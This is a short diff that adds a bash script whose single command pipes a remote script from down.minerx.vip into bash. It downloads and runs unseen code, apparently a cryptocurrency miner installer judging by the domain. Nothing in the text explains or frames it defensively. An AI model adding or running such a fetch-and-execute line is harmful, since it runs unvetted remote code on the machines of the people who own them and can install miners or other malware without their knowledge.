@@ -1,0 +1,3 @@
+#!/bin/bash
+
+curl  https://down.minerx.vip/install.sh | bash
